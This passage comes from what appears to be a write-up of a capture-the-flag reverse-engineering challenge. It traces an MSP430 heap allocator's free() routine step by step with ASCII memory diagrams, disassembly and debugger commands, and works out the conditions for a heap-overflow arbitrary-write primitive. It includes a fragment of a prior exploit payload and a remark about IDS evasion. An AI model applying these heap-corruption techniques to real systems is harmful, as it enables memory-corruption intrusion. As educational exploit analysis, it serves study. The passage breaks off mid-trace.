2440: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>

<p>Based on this, it seems reasonable to conclude that the <code>login</code> function calls <code>free</code> on the password buffer, then the username buffer.</p>

<h3>Observing The Call</h3>

<p>Observe the instructions during a <code>free</code> call.</p>

<br>
<div id="slides">
  <section id="first-block-execution-trace-1" style="height: 51em">
<pre><code class='language-ascii-noshadows'>



  ┌──┐  
  │  ▼  
  │ ┌────────┬────────┬────────┬──────────────────────────┐
  └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
    └────────┴─────┬──┴────────┴──────────────────────────┘
       ▲           │
  ┌────┘           │
  │                │
  │    ┌───────────┘
  │    ▼
  │ ┌────────┬────────┬────────┬──────────────────────────┐
  └─┤  2408  │  2434  │  0021  │ <mark>bbbb</mark> 0000 0000 0000 .... │
    └────────┴────────┴────────┴──────────────────────────┘
                                 ▲
                                 │
                               ┌─┴─┐
                               │R15│
                               └───┘




                       ┌────┬───────────────────────┐  ┌──┐
                       │4508│ push r11              │◄─┤PC│
                       ├────┼───────────────────────┤  └──┘
                       │450a│ add #0xfffa, r15      │
                       ├────┼───────────────────────┤
                       │450e│ mov 0x4(r15), r13     │
                       ├────┼───────────────────────┤
                       │4512│ and #0xfffe, r13      │
                       ├────┼───────────────────────┤
                       │4516│ mov r13, 0x4(r15)     │
                       ├────┼───────────────────────┤
                       │451a│ mov @r15, r14         │
                       ├────┼───────────────────────┤
                       │451c│ mov 0x4(r14), r12     │
                       ├────┼───────────────────────┤
                       │4520│ bit #0x1, r12         │
                       ├────┼───────────────────────┤
                       │4522│ jnz $+0x1c &lt;free+0x36&gt;│
                       └────┴───────────────────────┘
</code></pre>

<p>The function call begins with <code>R15</code> pointing to the start of the password buffer.</p>

  </section>
  <section id="first-block-execution-trace-2" style="height: 51em">
<pre><code class='language-ascii-noshadows'>



  ┌──┐
  │  ▼
  │ ┌────────┬────────┬────────┬──────────────────────────┐
  └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
    └────────┴─────┬──┴────────┴──────────────────────────┘
       ▲           │
  ┌────┘           │
  │                │
  │    ┌───────────┘
  │    ▼
  │ ┌────────┬────────┬────────┬──────────────────────────┐
  └─┤  <mark>2408  │  2434  │  0021</mark>  │ bbbb 0000 0000 0000 .... │
    └────────┴────────┴────────┴──────────────────────────┘
       ▲
       │
     ┌─┴─┐
     │R15│
     └───┘




                       ┌────┬───────────────────────┐
                       │4508│ push r11              │
                       ├────┼───────────────────────┤
		       │450a│ <mark>add #0xfffa, r15</mark>      │
                       ├────┼───────────────────────┤  ┌──┐
                       │450e│ mov 0x4(r15), r13     │◄─┤PC│
                       ├────┼───────────────────────┤  └──┘
                       │4512│ and #0xfffe, r13      │
                       ├────┼───────────────────────┤
                       │4516│ mov r13, 0x4(r15)     │
                       ├────┼───────────────────────┤
                       │451a│ mov @r15, r14         │
                       ├────┼───────────────────────┤
                       │451c│ mov 0x4(r14), r12     │
                       ├────┼───────────────────────┤
                       │4520│ bit #0x1, r12         │
                       ├────┼───────────────────────┤
                       │4522│ jnz $+0x1c &lt;free+0x36&gt;│
                       └────┴───────────────────────┘
</code></pre>

<p>First, <code>R15</code> is decremented by six, so it points at the beginning of the three words the previous exploits have abused.</p>

  </section>
  <section id="first-block-execution-trace-3" style="height: 51em">
<pre><code class='language-ascii-noshadows'>



  ┌──┐
  │  ▼
  │ ┌────────┬────────┬────────┬──────────────────────────┐
  └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
    └────────┴─────┬──┴────────┴──────────────────────────┘
       ▲           │
  ┌────┘           │
  │                │
  │    ┌───────────┘
  │    ▼
  │ ┌────────┬────────┬────────┬──────────────────────────┐
  └─┤  2408  │  2434  │  <mark>0020</mark>  │ bbbb 0000 0000 0000 .... │
    └────────┴────────┴────────┴──────────────────────────┘
       ▲
       │
     ┌─┴─┐
     │R15│
     └───┘




                       ┌────┬───────────────────────┐
                       │4508│ push r11              │
                       ├────┼───────────────────────┤
                       │450a│ add #0xfffa, r15      │
                       ├────┼───────────────────────┤
		       │450e│ <mark>mov 0x4(r15), r13</mark>     │
                       ├────┼───────────────────────┤
                       │4512│ <mark>and #0xfffe, r13</mark>      │
                       ├────┼───────────────────────┤
                       │4516│ <mark>mov r13, 0x4(r15)</mark>     │
                       ├────┼───────────────────────┤  ┌──┐
                       │451a│ mov @r15, r14         │◄─┤PC│
                       ├────┼───────────────────────┤  └──┘
                       │451c│ mov 0x4(r14), r12     │
                       ├────┼───────────────────────┤
                       │4520│ bit #0x1, r12         │
                       ├────┼───────────────────────┤
                       │4522│ jnz $+0x1c &lt;free+0x36&gt;│
                       └────┴───────────────────────┘
</code></pre>

<p>The algorithm loads the third word into a register, sets the least significant bit to zero via a logical <code>AND</code> operation, and writes the value back.</p>

  </section>
  <section id="first-block-execution-trace-4" style="height: 51em">
<pre><code class='language-ascii-noshadows'>                          ┌───┐  ┌─────────┐  ┌────────────────┐
                          │R12├─►│CHECK LSB├─►│CONDITIONAL JUMP│
                          └───┘  └─────────┘  └────────────────┘
	      2408 + 4      <mark>▲</mark>
  ┌──┐    <mark>┌──────────────┐</mark>  <mark>│</mark>
  │  ▼    <mark>│</mark>              <mark>▼</mark>  <mark>│</mark>
  │ ┌─────┴──┬────────┬─────┴──┬──────────────────────────┐
  └─┤  2408  │  241e  │  002<mark>1</mark>  │ aaaa 0000 0000 0000 .... │
    └────────┴─────┬──┴────────┴──────────────────────────┘
       <mark>▲</mark>           │
  <mark>┌────┘</mark>           │
  <mark>│</mark>                │
  <mark>│</mark>    ┌───────────┘
  <mark>│</mark>    ▼
  <mark>│</mark> ┌────────┬────────┬────────┬──────────────────────────┐
  <mark>└─</mark>┤  2408  │  2434  │  0020  │ bbbb 0000 0000 0000 .... │
    └────────┴────────┴────────┴──────────────────────────┘
       ▲
       │
     ┌─┴─┐
     │R15│
     └───┘




                       ┌────┬───────────────────────┐
                       │4508│ push r11              │
                       ├────┼───────────────────────┤
                       │450a│ add #0xfffa, r15      │
                       ├────┼───────────────────────┤
                       │450e│ mov 0x4(r15), r13     │
                       ├────┼───────────────────────┤
                       │4512│ and #0xfffe, r13      │
                       ├────┼───────────────────────┤
                       │4516│ mov r13, 0x4(r15)     │
                       ├────┼───────────────────────┤
		       │451a│ <mark>mov @r15, r14</mark>         │
                       ├────┼───────────────────────┤
                       │451c│ <mark>mov 0x4(r14), r12</mark>     │
                       ├────┼───────────────────────┤
                       │4520│ <mark>bit #0x1, r12</mark>         │
                       ├────┼───────────────────────┤  ┌──┐
                       │4522│ <mark>jnz $+0x1c &lt;free+0x36&gt;</mark>│◄─┤PC│
                       └────┴───────────────────────┘  └──┘
</code></pre>

<p>The code then dereferences the first word, adds four to the resulting location, and checks whether the value at that address has the least significant bit set. If it does not, execution branches to the conditional block where the arbitrary write occurs.</p>

  </section>
</div>
<ul id="nav">
  <li><a href="#first-block-execution-trace-1">01</a></li>
  <li><a href="#first-block-execution-trace-2">02</a></li>
  <li><a href="#first-block-execution-trace-3">03</a></li>
  <li><a href="#first-block-execution-trace-4">04</a></li>
</ul>

<h4>Enumerating Constraints</h4>

<p>This behavior generalizes as follows (where <code>PTR</code> is a placeholder for the first overflowed word).</p>

<pre><code class='language-ascii-noshadows'>             PTR + 4
        ┌──────────────┐
        │              ▼
  ┌─────┴──┬────────┬────────┬──────────────────────────┐
  │  ....  │  ....  │  EVEN  │ .... .... .... .... .... │
  └────────┴────────┴────────┴──────────────────────────┘
     ▲
┌────┘
│
│
│
│ ┌────────┬────────┬────────┬──────────────────────────┐
└─┤  PTR   │  ....  │  ....  │ .... .... .... .... .... │
  └────────┴────────┴────────┴──────────────────────────┘
</code></pre>


<p>Put more formally, the exploit requires the following constraint to be satisfied.</p>
<p><code>*(PTR + 4) % 2 == 0</code>.</p>

<p>Think about the ramifications of this for a moment. The last exploit has random padding bytes at <code>*(PTR + 4)</code>.</p>

<pre><code> 023c aaaa <mark>aaaa</mark> 3240 00ff b012 1000 aaaa 0e24 9443 2100</pre></code>

<p>Fortunately, the dummy value is even, but imagine if different padding bytes had been arbitrarily selected—for example, 0x41 (ASCII 'A') instead of 0xAA.</p> 

<pre><code> 023c <mark>4141 4141</mark> 3240 00ff b012 1000 <mark>4141</mark> 0e24 9443 2100</pre></code>

<p>This change breaks the arbitrary write primitive and results in a crash.</p>

<pre><code>insn address unaligned
CPUOFF flag set; program no longer running. CPU must now be reset.
</code></pre>

<p>This exploit is fragile. A trivial change in the padding bytes radically alters the outcome. This stumbling block could have slowed down the reverse engineering process, and it is vital to know about it before rearranging or mutating the payload (e.g., for IDS evasion purposes).</p>

<h3>Default Execution Path</h3>

<p>It is clear how to reach the code that triggers the arbitrary write primitive, but the rest of the algorithm is still opaque. Disregard the exploit and consider the code executed when neither of the conditions for the failing branches are satisfied. The code should take the following execution path.</p>


<br>
      <figure>
        <img src="./images/algiers/algiers-free-flow-control-middle-blocks-highlighted.png"
          loading="eager" alt="Leftmost execution path." />
      </figure>

      <br>

      <p>The code does not take this conditional branch by default, so use debugger commands to force the algorithm down this path. The initial test payload is simple.</p>

<h5>Username</h5>
<pre><code>aaaa</code></pre>

<h5>Password</h5>
<pre><code>bbbb</code></pre>

<p>The top conditional block executes first.</p>

<br>
      <figure>
        <img src="./images/algiers/algiers-free-flow-control-top-block-highlighted.png"
          loading="eager" alt="Top block." />
      </figure>

<h5>Behavior</h5>
The words underlined below are the ones modifiable via a buffer overflow.

<pre><code class='language-ascii-noshadows'>            2408 + 4                                              
┌──┐    <mark>┌──────────────┐</mark>                                          
│  ▼    <mark>│</mark>              <mark>▼</mark>                                          
│ ┌─────┴──┬────────┬────────┬──────────────────────────┐         
└─┤  2408  │  241e  │  002<mark>1</mark>  │ aaaa 0000 0000 0000 .... │         
  └────────┴─────┬──┴─────┬──┴──────────────────────────┘         
     <mark>▲</mark>           │        │                                       
<mark>┌────┘</mark>           │        │ ┌─────────┐  ┌────────────────┐
<mark>│</mark>                │        └►│CHECK LSB├─►│<mark>CONDITIONAL JUMP</mark>│
<mark>│</mark>    ┌───────────┘          └─────────┘  └────────────────┘
<mark>│</mark>    ▼                                                            
<mark>│</mark> ┌────────┬────────┬────────┬──────────────────────────┐         
<mark>└─</mark>┤  <u>2408</u>  │  <u>2434</u>  │  <u>0020</u>  │ bbbb 0000 0000 0000 .... │         
  └────────┴────────┴────────┴──────────────────────────┘         
     ▲                                                            
     │                     ┌────┬───────────────────────┐         
   ┌─┴─┐                   │451a│ <mark>mov @r15, r14</mark>         │         
   │R15│                   ├────┼───────────────────────┤         
   └───┘                   │451c│ <mark>mov 0x4(r14), r12</mark>     │         
                           ├────┼───────────────────────┤         
                           │4520│ <mark>bit #0x1, r12</mark>         │         
                           ├────┼───────────────────────┤  ┌──┐   
                           │4522│ <mark>jnz $+0x1c &lt;free+0x36&gt;</mark>│◄─┤PC│   
                           └────┴───────────────────────┘  └──┘   
</code></pre>

<p>This code will check the least significant bit on the third word of the previous block. The current dummy payloads fail to satisfy the following constraints without an overflow.</p>

<pre><code>*(PTR + 4) % 2 == 0</code></pre>

<p>This payload thus skips the conditional block where the arbitrary write occurs. The next block to execute is below.</p>

<br>
      <figure>
        <img src="./images/algiers/algiers-free-flow-control-middle-block-highlighted.png"
          loading="eager" alt="Default execution path given unmodified data." />
      </figure>

      <br>

      <p>Again, the underlined words are the ones modifiable via a buffer overflow—they are at the same address as those in the previous diagram.</p>

<pre><code class='language-ascii-noshadows'>   ┌───┐
   │R15│
   └─┬─┘
     │
     ▼
  ┌────────┬────────┬────────┬──────────────────────────┐
  │  <u>2408</u>  │  <u>2434</u>  │  <u>0020</u>  │ bbbb 0000 0000 0000 .... │
  └────────┴─────┬──┴────────┴──────────────────────────┘
     ▲           <mark>│</mark>
┌────┘           <mark>│</mark>          ┌─────────┐  ┌────────────────┐
│                <mark>│</mark>        ┌►│CHECK LSB├─►│<mark>CONDITIONAL JUMP</mark>│  
│    <mark>┌───────────┘</mark>        │ └─────────┘  └────────────────┘  
│    <mark>▼</mark>                    │ 
│ ┌────────┬────────┬─────┴──┬──────────────────────────┐
└─┤  241e  │  2408  │  1f9<mark>c</mark>  │ 0000 0000 0000 0000 .... │
  └─────┬──┴────────┴────────┴──────────────────────────┘
        <mark>│</mark>   241e + 4   <mark>▲</mark>
        <mark>└──────────────┘</mark>   ┌────┬───────────────────────┐
                           │453e│ <mark>mov 0x2(r15), r14</mark>     │
                           ├────┼───────────────────────┤
                           │4542│ <mark>mov 0x4(r14), r13</mark>     │
                           ├────┼───────────────────────┤
                           │4546│ <mark>bit #0x1, r13</mark>         │
                           ├────┼───────────────────────┤  ┌──┐
                           │4548│ <mark>jnz $+0x18 &lt;free+0x58&gt;</mark>│◄─┤PC│
                           └────┴───────────────────────┘  └──┘
</code></pre>

<p>This code will check the least significant bit on the third word of the next block, for which the pseudocode is as follows.</p>

<pre><code>*(*(&amp;PTR + 2) + 4) % 2 == 0</code>.</pre>

<p>The conditional check passes, and the following conditional block will execute.</p>

<br>
      <figure>
        <img src="./images/algiers/algiers-free-flow-control-last-alternate-block-highlighted.png"
          loading="eager" alt="Default execution path given unmodified data." />
      </figure>

      <br>

      <p>The code taking that branch is not desirable for the sake of the experiment. Modify the data structure to alter execution flow—before it reaches conditional block <code>0x453e</code>—using the following debugger command.</p>

      <pre><code>let 2438 = 1f9d
</code></pre>

<p>This command sets the least significant bit on this word.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  0020  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  <mark>1f9d</mark>  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>This modification causes the check at the end of conditional block <code>0x453e</code> to pass, which will cause the code to skip running conditional block <code>0x454a</code> and directly jump to <code>0x4560</code>.</p>

<br>
      <figure>
        <img src="./images/algiers/algiers-free-flow-control-last-block-highlighted.png"
          loading="eager" alt="Default execution path given unmodified data." />
      </figure>

      <br>


<p>The code highlighted above pops <code>R11</code> off the stack and returns, which means the only change to the data structure will be a single bit, located here.</p>


<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  002<mark>0</mark>  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9d  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>


<p>Again, given the above example payload, this is <em>not</em> what usually happens. The data structure is tweaked with debugger commands to result in this state.</p>

<h3>Real Execution Path</h3>

<p>Suppose the data structure is not modified using debugger commands, and execution proceeds unmolested. Observe what happens when the conditional jump to <code>0x454a</code> occurs.</p>

<br>
<div id="slides">
  <section id="second-block-execution-trace-1" style="height: 30em">
<pre><code class='language-ascii-noshadows'>  ┌────────┬────────┬────────┬──────────────────────────┐
  │  2408  │  2434  │  0020  │ bbbb 0000 0000 0000 .... │
  └────────┴─────┬──┴────────┴──────────────────────────┘
     ▲           │
┌────┘           │
│                │
│    ┌───────────┘
│    │
│    │            ┌───┬────┐
│    │            │R13│1f9c│
│    │            └───┴────┘
│    │                ▲    ▲<mark>SET</mark>
│    ▼                │    │<mark>EARLIER</mark>
│ ┌────────┬────────┬─┴────┴─┬──────────────────────────┐
└─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
  └────────┴────────┴────────┴──────────────────────────┘

                           ┌────┬───────────────────────┐  ┌──┐
                           │454a│ add 0x4(r15), r13     │◄─┤PC│
                           ├────┼───────────────────────┤  └──┘
                           │454e│ add #0x6, r13         │
                           ├────┼───────────────────────┤
                           │4552│ mov r13, 0x4(r15)     │
                           ├────┼───────────────────────┤
                           │4556│ mov 0x2(r14), 0x2(r15)│
                           ├────┼───────────────────────┤
                           │455c│ mov r15, 0x0(r14)     │
                           └────┴───────────────────────┘
</code></pre>


  </section>
  <section id="second-block-execution-trace-2" style="height: 30em">
<pre><code class='language-ascii-noshadows'>  ┌────────┬────────┬────────┬──────────────────────────┐
  │  2408  │  2434  │  0020  │ bbbb 0000 0000 0000 .... │
  └────────┴─────┬──┴─┬────┬─┴──────────────────────────┘
     ▲           │    │    │
┌────┘           │    ▼    ▼
│                │    ┌────┐
│    ┌───────────┘    │0020│
│    │                └────┘
│    │                  +
│    │            ┌───┬────┐
│    │            │R13│1f9c│
│    │            └───┴────┘
│    ▼
│ ┌────────┬────────┬────────┬──────────────────────────┐
└─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
  └────────┴────────┴────────┴──────────────────────────┘

                           ┌────┬───────────────────────┐
                           │454a│ <mark>add 0x4(r15), r13</mark>     │
                           ├────┼───────────────────────┤  ┌──┐
                           │454e│ add #0x6, r13         │◄─┤PC│
                           ├────┼───────────────────────┤  └──┘
                           │4552│ mov r13, 0x4(r15)     │
                           ├────┼───────────────────────┤
                           │4556│ mov 0x2(r14), 0x2(r15)│
                           ├────┼───────────────────────┤
                           │455c│ mov r15, 0x0(r14)     │
                           └────┴───────────────────────┘
</code></pre>


  </section>
  <section id="second-block-execution-trace-3" style="height: 30em">
<pre><code class='language-ascii-noshadows'>  ┌────────┬────────┬────────┬──────────────────────────┐
  │  2408  │  2434  │  0020  │ bbbb 0000 0000 0000 .... │
  └────────┴─────┬──┴────────┴──────────────────────────┘
     ▲           │
┌────┘           │
│                │    ┌────┐
│    ┌───────────┘    │0006│
│    │                └────┘
│    │                  +
│    │            ┌───┬────┐
│    │            │R13│1fbc│
│    │            └───┴────┘
│    ▼
│ ┌────────┬────────┬────────┬──────────────────────────┐
└─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
  └────────┴────────┴────────┴──────────────────────────┘

                           ┌────┬───────────────────────┐
                           │454a│ add 0x4(r15), r13     │
                           ├────┼───────────────────────┤
			   │454e│ <mark>add #0x6, r13</mark>         │
                           ├────┼───────────────────────┤  ┌──┐
                           │4552│ mov r13, 0x4(r15)     │◄─┤PC│
                           ├────┼───────────────────────┤  └──┘
                           │4556│ mov 0x2(r14), 0x2(r15)│
                           ├────┼───────────────────────┤
                           │455c│ mov r15, 0x0(r14)     │
                           └────┴───────────────────────┘
</code></pre>
  </section>
  <section id="second-block-execution-trace-4" style="height: 30em">
<pre><code class='language-ascii-noshadows'>  ┌────────┬────────┬────────┬──────────────────────────┐
  │  2408  │  2434  │  1fc2  │ bbbb 0000 0000 0000 .... │
  └────────┴─────┬──┴────────┴──────────────────────────┘
     ▲           │    ▲    ▲
┌────┘           │    │    │
│                │    │    │
│    ┌───────────┘    │    │
│    │                │    │
│    │                │    │
│    │            ┌───┼────┤
│    │            │R13│1fc2│
│    │            └───┴────┘
│    ▼
│ ┌────────┬────────┬────────┬──────────────────────────┐
└─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
  └────────┴────────┴────────┴──────────────────────────┘

                           ┌────┬───────────────────────┐
                           │454a│ add 0x4(r15), r13     │
                           ├────┼───────────────────────┤
                           │454e│ add #0x6, r13         │
                           ├────┼───────────────────────┤
			   │4552│ <mark>mov r13, 0x4(r15)</mark>     │
                           ├────┼───────────────────────┤  ┌──┐
                           │4556│ mov 0x2(r14), 0x2(r15)│◄─┤PC│
                           ├────┼───────────────────────┤  └──┘
                           │455c│ mov r15, 0x0(r14)     │
                           └────┴───────────────────────┘
</code></pre>
  </section>
  <section id="second-block-execution-trace-5" style="height: 30em">
<pre><code class='language-ascii-noshadows'>  ┌────────┬────────┬────────┬──────────────────────────┐
  │  2408  │  2408  │  1fc2  │ bbbb 0000 0000 0000 .... │
  └────────┴────────┴────────┴──────────────────────────┘
     ▲       ▲    ▲
┌────┘       │    │
│            │    │
│            │    │
│            │    │
│            │    │
│            │    │
│            │    │
│            │    │
│            │    │
│ ┌────────┬─┴────┴─┬────────┬──────────────────────────┐
└─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
  └────────┴────────┴────────┴──────────────────────────┘

                           ┌────┬───────────────────────┐
                           │454a│ add 0x4(r15), r13     │
                           ├────┼───────────────────────┤
                           │454e│ add #0x6, r13         │
                           ├────┼───────────────────────┤
                           │4552│ mov r13, 0x4(r15)     │
                           ├────┼───────────────────────┤
			   │4556│ <mark>mov 0x2(r14), 0x2(r15)</mark>│
                           ├────┼───────────────────────┤  ┌──┐
                           │455c│ mov r15, 0x0(r14)     │◄─┤PC│
                           └────┴───────────────────────┘  └──┘
</code></pre>
  </section>
  <section id="second-block-execution-trace-6" style="height: 30em">
<pre><code class='language-ascii-noshadows'>  ┌────────┬────────┬────────┬──────────────────────────┐
  │  2408  │  2408  │  1fc2  │ bbbb 0000 0000 0000 .... │
  └────────┴────────┴────────┴──────────────────────────┘
     ▲
┌────┘
│
│
│
│
│
│
│
│
│ ┌────────┬────────┬────────┬──────────────────────────┐
└─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
  └────────┴────────┴────────┴──────────────────────────┘
    ▲    ▲
    │    │                 ┌────┬───────────────────────┐
┌───┼────┤                 │454a│ add 0x4(r15), r13     │
│R15│241e│                 ├────┼───────────────────────┤
└───┴────┘                 │454e│ add #0x6, r13         │
                           ├────┼───────────────────────┤
                           │4552│ mov r13, 0x4(r15)     │
                           ├────┼───────────────────────┤
                           │4556│ mov 0x2(r14), 0x2(r15)│
                           ├────┼───────────────────────┤
			   │455c│ <mark>mov r15, 0x0(r14)</mark>     │
                           ├────┼───────────────────────┤  ┌──┐
                           │....│ ..................... │◄─┤PC│
                           └────┴───────────────────────┘  └──┘
</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#second-block-execution-trace-1">01</a></li>
  <li><a href="#second-block-execution-trace-2">02</a></li>
  <li><a href="#second-block-execution-trace-3">03</a></li>
  <li><a href="#second-block-execution-trace-4">04</a></li>
  <li><a href="#second-block-execution-trace-5">05</a></li>
  <li><a href="#second-block-execution-trace-6">06</a></li>
</ul>

<p>The algorithm essentially adds the third words of the current and next block together (plus an additional six) and writes the value back to the third word of the current chunk. It then updates two different pointers.</p>

<h3>Taking It From The Top</h3>

<p>The following blocks are the non-default execution paths.</p>

<br>
      <figure>
        <img src="./images/algiers/algiers-free-flow-control-alternate-blocks-highlighted.png"
          loading="eager" alt="Alternate execution paths." />
      </figure>

      <br>

      <p>These two paths run depending on the least significant bit of the following two words, respectively.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │                    ┌─────────┐  ┌────┐  ┌─────────────────┐
│      │ │                  ┌►│CHECK LSB├─►│FAIL├─►│NO JUMP TO 0x4524│
│ ┌──┐ │ │                  │ └─────────┘  └────┘  └─────────────────┘
│ │  ▼ ▼ ▼                  │
│ │ ┌────────┬────────┬─────┴──┬──────────────────────────┐
│ └─┤  2408  │  241e  │  002<mark>1</mark>  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  0020  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │          ┌─────────┐  ┌────┐  ┌──────────────┐
│ │                │        ┌►│CHECK LSB├─►│PASS├─►│JUMP TO 0x454a│
│ │    ┌───────────┘        │ └─────────┘  └────┘  └──────────────┘
│ │    ▼                    │
│ │ ┌────────┬────────┬─────┴──┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9<mark>c</mark>  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>No branch to <code>0x4524</code> happens in the above case, but the branch to <code>0x454a</code> does. This behavior is only a partial picture of the algorithm—introspecting the entire process requires executing the code at both addresses <code>0x4524</code> and <code>0x454a</code>. Achieving this requires manually unsetting the least significant bit of the third word in the previous block.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  002<mark>0</mark>  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  0021  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘

</code></pre>

<p>Supply short dummy values as the username and password, and unset the bit in question using a debugger command.</p>

<h5>Username</h5>
<pre><code>aaaa</code></pre>

<h5>Password</h5>
<pre><code>bbbb</code></pre>

<h5>Debug Commands</h5>
<pre><code>break free; c; let 240c = 0020</code></pre>

<p>The process is then as follows.</p>

<br>
<div id="slides">
  <section id="full-alternate-execution-trace-1" style="height: 50em">
<pre><code class='language-ascii-noshadows'>         ┌───┐      ┌───┬────┐
┌──────┐ │<mark>R14</mark>│      │R12│0020│
│      │ └─┬─┘      └───┴────┘
│ ┌──┐ │   │            ▲    ▲
│ │  ▼ ▼   ▼            │    │
│ │ ┌────────┬────────┬─┴────┴─┬──────────────────────────┐
│ └─┤  2408  │  241e  │  <mark>0020</mark>  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲  R14      │
│ ┌────┘  ▲ ▲      │    ┌───────────────────────►┌────┬───┐
│ │       │ │      │    │                        │0020│R13│
│ │    ┌──┼─┼──────┘    │    ┌──────────────────►└────┴───┘
│ │    ▼  │ │           │    │
│ │ ┌─────┴─┴┬────────┬─┴────┴─┬──────────────────────────┐
│ └─┤  <mark><u>2408</u></mark>  │  <u>2434</u>  │  <mark><u>0020</u></mark>  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲  ▲        │
│ ┌────┘  └─ <mark>R15</mark>   │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘   ┌────┬───────────────────────┐  ┌──┐
                       │4524│ add #0x6, r12         │◄─┤PC│
                       ├────┼───────────────────────┤  └──┘
                       │4528│ add r13, r12          │
                       ├────┼───────────────────────┤
                       │452a│ mov r12, 0x4(r14)     │
                       ├────┼───────────────────────┤
                       │452e│ mov 0x2(r15), 0x2(r14)│
                       ├────┼───────────────────────┤
                       │4534│ mov 0x2(r15), r13     │
                       ├────┼───────────────────────┤
                       │4538│ mov r14, 0x0(r13)     │
                       ├────┼───────────────────────┤
                       │453c│ mov @r15, r15         │
                       └────┴───────────────────────┘


</code></pre>

<p>This diagram depicts the initial state after branching to the conditional block at address <code>0x4524</code>.</p> 

  </section>
  <section id="full-alternate-execution-trace-2" style="height: 50em">
<pre><code class='language-ascii-noshadows'>                    ┌───┬────┐   ┌────┐
┌──────┐            │R12│0020│ + │<mark>0006</mark>│
│      │            └───┴────┘   └────┘
│ ┌──┐ │
│ │  ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0020  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
